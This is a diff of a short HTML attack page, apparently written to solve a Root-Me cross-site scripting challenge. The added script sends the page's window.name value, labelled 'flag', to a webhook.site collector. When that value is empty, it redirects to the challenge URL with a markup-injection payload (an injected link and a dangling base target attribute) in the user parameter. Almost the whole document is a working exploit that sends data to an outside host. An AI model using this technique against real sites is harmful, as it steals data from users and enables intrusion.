@@ -1,8 +1,11 @@
 <html>
 <body>
 <script>
-document.write(window.name);
-new Image().src='https://webhook.site/95060282-512e-44c3-ae8c-5119dd69b125?flag='+encodeURIComponent(window.name);
+if(window.name) {
+    new Image().src='https://webhook.site/95060282-512e-44c3-ae8c-5119dd69b125?flag='+encodeURIComponent(window.name);
+} else {
+    window.location.replace('http://challenge01.root-me.org:58029/page?user=</h1><a href=https://fadeaway808.github.io/xss/index.html>Click me</a><base target=\'');
+}
 </script>
 </body>
 </html>
